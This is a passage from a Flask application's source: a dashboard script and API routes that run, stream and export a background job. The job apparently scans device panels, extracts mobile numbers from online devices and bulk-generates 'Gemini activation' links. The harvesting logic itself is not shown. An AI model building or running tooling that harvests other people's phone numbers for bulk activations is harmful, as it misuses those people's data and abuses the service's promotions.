      <td>${row.serial}</td>
      <td class="num">${row.mobile || ""}</td>
      <td class="${statusClass(row.status)}">${row.status || ""}</td>
      <td>${row.url ? `<a href="${row.url}" target="_blank" rel="noopener">open</a>` : "—"}</td>
    `;
    tb.insertBefore(tr, tb.firstChild);
    $("resCount").textContent = tb.children.length;
  }

  function setPill(state) {
    const p = $("statePill");
    p.textContent = state;
    p.className = "pill " + ({
      running: "run", done: "done", error: "err", stopped: "stop"
    }[state] || "");
  }

  function applySnapshot(snap) {
    $("sPanel").textContent = `${snap.panel_done} / ${snap.panel_total}`;
    $("sDevices").textContent = snap.online_count;
    $("sNumbers").textContent = snap.target_total;
    $("sLinks").textContent = (snap.links || []).length;

    // progress
    let pct = 0;
    if (snap.phase === "scanning_panels") pct = (snap.panel_done / Math.max(1, snap.panel_total)) * 40;
    else if (snap.phase === "extracting_numbers") pct = 40 + (snap.online_count > 0 ? 15 : 15);
    else if (snap.phase === "activating") {
      const done = snap.target_done || 0;
      const total = Math.max(1, snap.target_total);
      pct = 55 + (done / total) * 45;
    } else if (snap.phase === "finished") pct = 100;
    $("progBar").style.width = Math.min(100, pct) + "%";

    if (snap.status !== "running") {
      $("startBtn").disabled = false;
      $("stopBtn").disabled = true;
    }
  }

  function connectEvents(id) {
    if (es) es.close();
    es = new EventSource(`/api/stream/${id}`);

    es.addEventListener("panel", e => {
      const d = JSON.parse(e.data);
      const kind = d.status === "ok" ? "info" : "warn";
      logLine(kind, `panel ${d.idx}/${d.total} — online ${d.online} (total ${d.online_total}) — ${d.url.replace(/^https?:\/\//,"").split(".")[0]}`);
    });
    es.addEventListener("extract", e => {
      const d = JSON.parse(e.data);
      if (d.done === d.total || d.done % 10 === 0) logLine("info", `extracted ${d.done}/${d.total} devices — unique numbers: ${d.numbers}`);
    });
    es.addEventListener("target", e => {
      const d = JSON.parse(e.data);
      const kind = statusClass(d.status) === "status-ok" ? "ok" : statusClass(d.status) === "status-err" ? "err" : "info";
      logLine(kind, `[${d.serial}/${d.total}] …${d.mobile.slice(-4)} → ${d.status}${d.url ? " ✓" : ""}`);
      addResult(d);
    });
    es.addEventListener("phase", e => {
      const d = JSON.parse(e.data);
      logLine("info", `phase → ${d.phase}`);
    });
    es.addEventListener("log", e => {
      const d = JSON.parse(e.data);
      logLine(d.level === "error" ? "err" : d.level === "warn" ? "warn" : "info", d.msg);
    });
    es.addEventListener("done", e => {
      const snap = JSON.parse(e.data);
      applySnapshot(snap);
      setPill(snap.status);
      logLine(snap.status === "done" ? "ok" : "warn", `finished — status: ${snap.status} (${snap.elapsed}s)`);
      $("dlLinks").style.display = snap.links.length ? "inline-block" : "none";
      $("dlLinks").href = `/api/download/${id}/links.txt`;
      $("dlResults").style.display = snap.results.length ? "inline-block" : "none";
      $("dlResults").href = `/api/download/${id}/results.csv`;
      stopTick();
      es.close();
      es = null;
    });
    es.addEventListener("error", e => {
      try { const d = JSON.parse(e.data); logLine("err", d.msg || "error"); } catch(_) {}
    });
    es.onerror = () => {
      // EventSource auto-reconnects; if job is done we already closed it.
    };
  }

  function startTick() {
    t0 = Date.now();
    stopTick();
    tick = setInterval(() => {
      const s = Math.floor((Date.now() - t0) / 1000);
      $("elapsed").textContent = s + "s";
    }, 1000);
  }
  function stopTick() { if (tick) { clearInterval(tick); tick = null; } }

  $("startBtn").addEventListener("click", async () => {
    $("startBtn").disabled = true;
    $("stopBtn").disabled = false;
    $("logBox").innerHTML = "";
    $("resBox").innerHTML = '<div class="empty">no results yet</div>';
    $("resCount").textContent = "0";
    $("progBar").style.width = "0%";
    setPill("running");
    startTick();

    const r = await fetch("/api/start", { method: "POST" });
    const j = await r.json();
    if (!j.job_id) {
      logLine("err", "failed to start job: " + (j.error || "unknown"));
      $("startBtn").disabled = false;
      $("stopBtn").disabled = true;
      setPill("error");
      stopTick();
      return;
    }
    jobId = j.job_id;
    logLine("info", `job started — id ${jobId}`);
    connectEvents(jobId);
  });

  $("stopBtn").addEventListener("click", async () => {
    if (!jobId) return;
    $("stopBtn").disabled = true;
    await fetch(`/api/stop/${jobId}`, { method: "POST" });
    logLine("warn", "stop requested…");
  });

  // restore state on load (in case of refresh)
  fetch("/api/status").then(r => r.json()).then(j => {
    if (j.active_job) {
      jobId = j.active_job;
      setPill(j.status);
      $("startBtn").disabled = true;
      $("stopBtn").disabled = false;
      startTick();
      connectEvents(jobId);
      logLine("info", `reattached to job ${jobId}`);
    }
  });
})();
</script>
</body>
</html>
"""


@app.route("/")
def index():
    return render_template_string(INDEX_HTML)


@app.route("/api/start", methods=["POST"])
def api_start():
    # Reject if a job is already running
    with JOBS_LOCK:
        for j in JOBS.values():
            if j.status == "running":
                return jsonify({"error": "a job is already running", "job_id": j.id}), 409

    job = create_job()
    job.thread = threading.Thread(target=run_scan, args=(job,), daemon=True)
    job.thread.start()
    return jsonify({"job_id": job.id})


@app.route("/api/stop/<job_id>", methods=["POST"])
def api_stop(job_id: str):
    job = get_job(job_id)
    if not job:
        return jsonify({"error": "job not found"}), 404
    job.stop_flag.set()
    return jsonify({"ok": True})


@app.route("/api/status")
def api_status():
    with JOBS_LOCK:
        for j in JOBS.values():
            if j.status == "running":
                return jsonify({"active_job": j.id, "status": j.status})
        # no running job; return most recent one
        if JOBS:
            last = list(JOBS.values())[-1]
            return jsonify({"active_job": None, "status": last.status, "last_id": last.id})
    return jsonify({"active_job": None, "status": "idle"})


@app.route("/api/job/<job_id>")
def api_job(job_id: str):
    job = get_job(job_id)
    if not job:
        return jsonify({"error": "job not found"}), 404
    return jsonify(job.snapshot())


@app.route("/api/stream/<job_id>")
def api_stream(job_id: str):
    job = get_job(job_id)
    if not job:
        return Response("event: error\ndata: {\"msg\":\"job not found\"}\n\n",
                        mimetype="text/event-stream")

    def gen():
        # initial snapshot
        yield f"event: phase\ndata: {json.dumps({'phase': job.phase})}\n\n"

        # replay buffered log
        with job.lock:
            buffered = list(job.log)
        for item in buffered:
            yield f"event: {item['event']}\ndata: {json.dumps(item['data'])}\n\n"

        # stream new events
        last_heartbeat = time.time()
        while True:
            try:
                item = job.queue.get(timeout=1)
                yield f"event: {item['event']}\ndata: {json.dumps(item['data'])}\n\n"
                if item["event"] in ("done", "error"):
                    break
            except Empty:
                if time.time() - last_heartbeat > 15:
                    yield ": ping\n\n"
                    last_heartbeat = time.time()
                # If job finished, break out
                if job.status in ("done", "error", "stopped") and job.queue.empty():
                    # give a final snapshot
                    yield f"event: done\ndata: {json.dumps(job.snapshot())}\n\n"
                    break

    return Response(gen(), mimetype="text/event-stream",
                    headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})


@app.route("/api/download/<job_id>/<filename>")
def api_download(job_id: str, filename: str):
    job = get_job(job_id)
    if not job:
        return "job not found", 404

    if filename == "links.txt":
        body = "\n".join(job.links)
        return Response(body, mimetype="text/plain",
                        headers={"Content-Disposition": f'attachment; filename="gemini_activation_links.txt"'})

    if filename == "results.csv":
        buf = io.StringIO()
        fields = ["serial", "device_id", "mobile", "status", "activation_url", "nepal_date", "nepal_time"]
        w = csv.DictWriter(buf, fieldnames=fields)
        w.writeheader()
        for row in job.results:
            w.writerow(row)
        return Response(buf.getvalue(), mimetype="text/csv",
                        headers={"Content-Disposition": 'attachment; filename="gemini_results.csv"'})

    return "unknown file", 404


# ==================== ENTRY ====================

if __name__ == "__main__":
    import os
    port = int(os.environ.get("PORT", 8000))
    app.run(host="0.0.0.0", port=port, threaded=True)